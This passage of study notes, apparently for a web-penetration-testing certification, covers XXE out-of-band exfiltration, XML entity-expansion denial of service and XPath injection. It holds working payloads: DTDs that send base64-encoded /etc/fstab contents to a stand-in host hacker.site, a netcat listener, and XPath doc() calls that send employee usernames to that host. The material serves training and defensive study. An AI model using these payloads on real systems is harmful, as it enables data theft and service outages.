+</code></pre><h3 id="60b19801-4117-4bb8-b688-3fabe1f7f013" class=""><strong>2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#2"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="938c6301-c7a5-44ff-a7af-434e402b9b0b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!DOCTYPE test [
+&lt;!ENTITY fakeEntity SYSTEM &quot;http://hacker.site:1337/XXE_OOB_TEST&quot;&gt;
+]&gt;
+
+...
+&amp;fakeEntity
+</code></pre><p id="49160d94-3c82-46a3-a5af-69efd49e95c6" class="">in kali:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="289ed571-52d1-488d-b36b-ecba6f5d25f3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">netcat -lvnp 1337 -k -w 1
+</code></pre><p id="b72412fd-546c-4a25-b4ce-e1bf56e3bec5" class="">Grab the xxeserver from github</p><p id="874ef05d-0b84-4997-ba4b-e2bee3da0a46" class="">Add these lines:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="52d409bb-9f2c-4518-a23b-60547388180a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">set :bind, &quot;xxe.hacker.site&quot;
+set :port, 80
+</code></pre><h3 id="b8114585-a309-47a1-b21d-ecf3ff589318" class=""><strong>evil DTD</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#evil-dtd"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0fda7008-c5cf-4d8f-b077-2ff2aeb41ccf" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % resource SYSTEM &quot;php://filter/read=conver.base64-encode/resource=file:///etc/fstab&quot;&gt;
+&lt;!ENTITY % LoadOOBEnt &quot;&lt;!ENTITY &amp;#x25; OOB SYSTEM &#x27;http://xxe.hacker.site/?p=%resource;&#x27;&gt; &quot;&gt;
+</code></pre><h3 id="fadb0e1b-9eb2-428b-b65f-53a4bac872cd" class=""><strong>evil XML</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#evil-xml"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ae7b2cbb-9b55-4588-9235-03fefca2e97b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!DOCTYPE XXE_OOB [
+  &lt;!ENTITY % EvilDTD SYSTEM &quot;http://hacker.site/evil.dtd&quot;&gt;
+  %EvilDTD;
+  %LoadOOBEnt; // the entity that defines a new entity
+  %OOB; // entity that performs the OOB communication
+]&gt;
+</code></pre><blockquote id="6ec329d8-0d37-4892-86cd-927d1dcab71a" class="">dont forget to open the xxeserver The space must be changed to + sign before it can be base64 decoded</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ee516639-9f8c-400f-b773-3df4cb273ae6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat &lt;file&gt; | tr &#x27; &#x27; &#x27;+&#x27; | base64 -d
+</code></pre><h2 id="19864b34-fbfc-4c43-84c6-36beb8e399f6" class=""><strong>XML Entity Expansion (XEE)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#xml-entity-expansion-xee"></a></strong></h2><p id="17196a06-01ed-42b1-93e3-bf54bfaf2b5b" class="">Its a <strong>Denial of Service</strong> Attack</p><h3 id="57540df7-5f53-4fe7-b2ec-af146d195708" class=""><strong>Recursive Entity Expansion</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#recursive-entity-expansion"></a></strong></h3><p id="e7f7265d-1ca0-4370-af51-3c5c14f10a01" class="">The most well-known XEE attack: <strong>Billion Laughs</strong></p><ul id="41a24512-db43-4c00-9e09-654b24acf281" class="bulleted-list"><li style="list-style-type:disc">The attack exploits XML parsers into exponentially resolving sets of small entities.</li></ul><blockquote id="1776baa2-3871-45f4-9d3e-d544b9accdad" class="">This is done in order to explode the data from a simple lol string to a billion lol strings</blockquote><h3 id="850dedec-0fc0-4349-97bb-1e69a878b841" class=""><strong>Billion Laughs Attack</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#billion-laughs-attack"></a></strong></h3><figure id="ca9d33d3-7d56-44ae-9cbc-3173338cb0bb" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/13.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/13.png"/></a></figure><p id="55feffe1-519f-43a3-a4a5-c345db0ff6e0" class="">This attack can grow to approximately 3GB of memory</p><blockquote id="d2f0bad7-5c5f-4f46-b212-71e19dc02ad7" class="">Thats quite a large amount of memory utilization and obviously quite devastating</blockquote><h3 id="988e3dfb-cde8-414e-8a40-78a1bb2dd02e" class=""><strong>Generic Entity Expansion</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#generic-entity-expansion"></a></strong></h3><p id="c1e2acec-91b5-476c-bb15-879e6051e5d9" class="">Another DoS attack is the <strong>Quadratic Blowup Attack</strong></p><figure id="d92adda0-fcda-4930-9631-06901104c71c" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/14.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/14.png"/></a></figure><blockquote id="f5373ecb-5cea-4f0f-b743-82df64032ae9" class="">We can obfuscate this malicious attack by moving the entities definition from the local DTD to an external one.</blockquote><p id="4be55d49-9224-4c18-8fcc-f53e3795c0b4" class="">Obfuscating:</p><figure id="bf8e8dfb-0f47-4ba4-8cfd-bd06d1731c0a" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/15.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/15.png"/></a></figure><h2 id="6ff6c6ee-fc96-4061-80ce-9043bb8e5f4c" class=""><strong>XPath Injection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#xpath-injection"></a></strong></h2><p id="77ef7572-6ae6-4721-954e-4c8d31e61171" class="">Must be known before playing with other parallel languages, such as:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="03d0d4b6-7a58-4c26-9d98-119d31c17a79" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- XQuery
+- XSLT
+- Xlink
+- XPointer
+</code></pre><blockquote id="97042b2e-cead-4596-9483-76bb2db65896" class="">XPath is regarded as the SQL For querying XML databases</blockquote><h3 id="e14c4747-f925-4f1f-80eb-80633f07c605" class=""><strong>XPath Recap</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#xpath-recap"></a></strong></h3><p id="0fbb06fc-1068-4698-9ebe-811cd041476a" class="">XPath allows us to navigate around the XML tree structure so that we can retrieve a list of nodes, an atomic value, or any sequence allowed by the data model that respects the searching criteria.</p><h3 id="e343bf9d-86eb-47ea-ae3c-ce39daa3e3c6" class=""><strong>New Operations and Expressions on Sequences</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#new-operations-and-expressions-on-sequences"></a></strong></h3><p id="5d717277-08d6-422c-9ff1-fcd0f9384e2e" class="">The most signigicant keyword: <strong>SEQUENCE</strong></p><p id="8dccb303-5b3f-432f-aee2-117b9ab04913" class="">→ http://www.w3.org/TR/xpath-functions/</p><p id="e2f6de6f-a407-441a-9e8a-da4509c8b8e2" class="">Sequence is an ordered collection of zero or more items. An item is either a node or an atomic value. A node is an instance of one of the node kinds defined in Data Model.</p><ul id="9739940c-e802-41cc-9f5b-41c578fd3248" class="bulleted-list"><li style="list-style-type:disc">Every XPath expression returns a sequence. This is an ordered grouping of atomic values or nodes with duplicates permitted.</li></ul><h3 id="a5458c1b-90c3-4e0b-9bde-493f1ee83830" class=""><strong>Function on Strings</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#function-on-strings"></a></strong></h3><p id="a7c7940d-f146-42b0-a2b4-2e19625470fa" class=""><strong>upper-case</strong> and <strong>lower-case</strong> are useful during detection phase, especially if we dont know the XPath version used.</p><ul id="68efe02b-a226-44b4-875b-1edf4cd7c612" class="bulleted-list"><li style="list-style-type:disc">If we are able to produce a positive output, then the function exists, therefore making it version 2.0</li></ul><p id="94bfeff5-20e3-4580-b5c3-988591a72aa6" class="">If a negative output is produced, then its version 1.0</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9ff3329c-43d7-4e2c-9c77-4a78b67cd8e6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/Employees/Employee[username=&quot;$_GET[&#x27;c&#x27;]&quot;]
+</code></pre><p id="92327f8e-6f01-426a-aa24-25cfedf5b68f" class=""><strong>base-uri</strong> is useful in detecting properties about URIs. Calling this function without passing any argument allows us to potentially obtain the full URI path of the current file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="146b5311-2485-473d-8944-2db64df81297" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">base-uri()
+# file://path/to/XMLfile.xml
+</code></pre><h3 id="c57313bf-ad13-4f15-8d8b-23ec170b5ee1" class=""><strong>FOR Operator</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#for-operator"></a></strong></h3><p id="73add760-3a96-46c2-bfd1-cea02f225728" class="">It enables iteration (looping) over sequences, therefore returning a new value For each repetition. The following XPath expression retrieves the list of usernames:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="570dc5b7-d52b-40bf-8323-e0dae389a328" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">for $x in /Employees/Employee return $x/username
+</code></pre><h3 id="cb14b2c2-7237-4e8b-870e-404e70fc9072" class=""><strong>Conditional Expression</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#conditional-expression"></a></strong></h3><ul id="a857c9d2-2bfa-4a4c-9314-7943dc2eee63" class="bulleted-list"><li style="list-style-type:disc"><strong>if</strong></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="273d7c57-bbc0-47b7-ae48-e686fde05135" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">if ($employee/role = 2)
+  then $employee
+  else 0
+</code></pre><h3 id="4d246a21-3271-4d60-9142-1b9767cb5601" class=""><strong>Regular Expression</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#regular-expression"></a></strong></h3><p id="a7f3bead-6c7f-4aef-aa28-012f57d357e5" class="">Another useful improvement involves the ability to use Regular Expression syntax For pattern matching using the keywords <strong>matches</strong>, <strong>replace</strong>, or <strong>tokenize</strong>.</p><ul id="c4052ce5-b4ab-490f-86b2-51599d118d86" class="bulleted-list"><li style="list-style-type:disc">These functions used in conjunction with conditional operators and other quantifiers are great toolkits For attackers.</li></ul><h3 id="8f6583cc-e450-4cf6-aca3-f26fe510126b" class=""><strong>Assemble/Disassemble Strings</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#assembledisassemble-strings"></a></strong></h3><p id="0a8df911-edb6-4810-8e21-25fb2b592ea6" class=""><strong>codepoints-to-string</strong> and <strong>string-to-codepoints</strong>.</p><blockquote id="a4870863-ebc4-48d5-9093-86b8d807183a" class="">They allow us to convert a string into a sequence of integer and respectively, from a sequence of integer returns a string:</blockquote><figure id="c9211067-2947-43f7-9a0a-5dd43fe02d90" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/16.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/16.png"/></a></figure><h3 id="aa583e69-f319-47a3-89ca-8e82d1e14a03" class=""><strong>Data Types</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#data-types"></a></strong></h3><p id="10e7a5a6-ad68-45ed-88e0-79029418ca98" class="">The first version of XPath supported four data types:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4506b37d-97ec-481d-bc95-f8940aca16b2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Number (floating-point)
+- String
+- Boolean
+- Node-Set
+</code></pre><p id="1f26a451-e47c-4b2b-8d6d-16c6bdc4ff4d" class="">v2.0 introduced support For all simple primite types built into the XML schema in addition to 19 simple types, such as <strong>dates</strong>, <strong>URIs</strong>, etc</p><figure id="5ab0e523-f078-4399-a227-d3bea9e65d8f" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/17.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/17.png"/></a></figure><p id="bd600a87-93a0-45aa-aa83-c03ea9ce473a" class="">Resource For Xpath:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3825a651-4737-43e6-a049-76578698d30e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.w3schools.com/xml/xpath_syntax.asp
+</code></pre><h2 id="93c51b87-9d8a-4929-a37b-dfd391c6b728" class=""><strong>Advanced XPath Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#advanced-xpath-exploitation"></a></strong></h2><h3 id="26660044-6cee-4817-b764-0381b0451014" class=""><strong>Blind Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#blind-exploitation"></a></strong></h3><h3 id="d9d596c1-891f-4c3b-91d9-2aebe60494d4" class=""><strong>Error Based:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#error-based"></a></strong></h3><ul id="c851da58-212f-4953-9652-2124af7038ec" class="bulleted-list"><li style="list-style-type:disc">Like exploiting SQL injection, the <strong>error based extraction</strong> technique is suitable if, with an XPath query, we can generate a runtime error and this error is detectable is some way.</li></ul><ul id="5ebc6096-b6cd-44a3-b008-4048c1c711cb" class="bulleted-list"><li style="list-style-type:disc">We want to configure our tests so that we trigger an error every time a specific condition is met.</li></ul><p id="d1e6786a-9b72-4c4d-bbce-5d407b9206d1" class=""><strong>error()</strong> raises an error and never returns a value which is exactly what we need FOr our tests</p><p id="673ae145-e103-4f88-8bdf-850d5054f9f0" class="">For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e950810b-699f-4cbc-9dce-ec3ed488ec46" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">... and (if ( $employee/role = 2) then error() else 0 ) ...
+</code></pre><blockquote id="f42cfb4b-df8f-4c32-a45b-2065521763f8" class="">The error can be shown in a div, as a 500 page, a custom HTTP status code, and / or many other methods</blockquote><h3 id="baec9e62-b7e1-4c8f-be39-f6345f05d63b" class=""><strong>Boolean Based:</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#boolean-based"></a></strong></h3><p id="09f8edcc-7805-4ea8-b216-f97ef4861c67" class="">By leveraging various inference techniques, we have to extract information based on a set of focused deductions</p><ul id="107ea73d-5be7-4601-bf24-096db367cc28" class="bulleted-list"><li style="list-style-type:disc">The most used are: <strong>boolean-based</strong> and <strong>time-based</strong> techniques, however in XPath there are no features that allow us to handle delays, therefore we can only use the Boolean attacks.</li></ul><ul id="d8feed70-5e50-4768-a0a9-b0ef0b3d7262" class="bulleted-list"><li style="list-style-type:disc">For example: String Functions that use Pattern Matching are useful in reducing the character search space</li></ul><p id="2ae8cfd6-fa0d-44f9-ae29-c106c1cc29f6" class="">→ http://www.w3.org/TR/xpath-functions/#string.match</p><p id="7cbc26f2-a732-44cc-a5d3-93b923ee0deb" class="">While the Functions on String Values, such as <strong>normalize-unicode</strong>, etc. Are useful in handling all the possible encoding (impossible without these functions).</p><p id="ba77bd58-3b3b-47ff-85b0-412b28d50855" class="">→ http://www.w3.org/TR/xpath-functions/#string-value-functions</p><h3 id="7cd1e7da-b6de-4cf0-acd8-86fa036bee0b" class=""><strong>OOB Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#oob-exploitation"></a></strong></h3><p id="3e1dbb76-69da-435a-8bd0-0444f7638800" class="">in Xpath 2.0 = http://www.w3.org/TR/xpath-functions/#func-doc</p><p id="e3d397ea-2c2c-4061-b3d5-8b081fda7d2b" class=""><strong>doc($uri)</strong></p><ul id="4cdb765d-c954-4738-a3cd-129b6642647b" class="bulleted-list"><li style="list-style-type:disc">If we are able to include a file, remotely or locally, in our target application, then we can do a lot of bad things and, of course, in this case , we can.</li></ul><p id="c3ee1fe4-e80b-47c1-a7aa-530a02e69489" class="">With the <strong>doc</strong> function, we can read any local XML file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e051adac-19e6-4a24-8bde-301b7d1ff44d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">(substring((doc(&#x27;file://protected/secret.xml&#x27;)/*[1]/*[1]/text()[1]),3,1))) &lt; 127
+</code></pre><h2 id="c826fc13-e4f1-42b7-baa5-174f916c4308" class=""><strong>HTTP Channel</strong><strong><a href="https://johnermac.github.io/notes/ewptx/xmlattacks/#http-channel"></a></strong></h2><p id="9efb509e-b2e2-487b-8bae-d640da4ebd2c" class="">We can trick the victim site into sending what we cant read to our controlled web server.</p><p id="f63e2c32-7c3d-40c8-9dff-17593a403581" class="">Example using the doc():</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22a62d15-2df1-4840-b001-9daf9fa8fc98" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">doc(concat(&quot;http://hacker.site/oob/&quot;, RESULTS_WE_WANT))
+doc(concat(&quot;http://hacker.site/oob/&quot;, /Employees/Employee[1]/username))
+</code></pre><p id="44b9a3ce-2101-478c-a97c-d74d32337393" class="">The URI has its rules and we need to encode out strings in order to make the format suitable For sending from the victim site to the attack site.</p><p id="5d8fde65-e6f3-40b7-a84d-c1acddb7572d" class=""><strong>encode-for-uri</strong> function:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c6b7d176-b8ba-4944-b8c7-9d265092325b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">doc(concat(&quot;http://hacker.site/oob/&quot;, encode-for-uri(/Employees/Employee[1]/username)))
+</code></pre><p id="9798687d-376f-4b12-8f1f-11458a6986be" class="">Setting up a listening HTTP server is quite simple; however, if we are lazy, then we can use use ‘xxeserve’ or ‘xcat’</p><p id="bc90f761-dc50-410a-b4b4-50b531bdd6c7" class="">→ xxeserve = https://github.com/joernchen/xxeserve</p><p id="451306e6-b159-41d9-a624-a9d586f5f59e" class="">→ xcat = http://xcat.readthedocs.org/</p><p id="eb1a2c3d-3d48-4233-a150-3816dbd6560f" class="">XCat is a command line tool that aides in the exploitation of Blind XPath injection flaws. Some features:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" 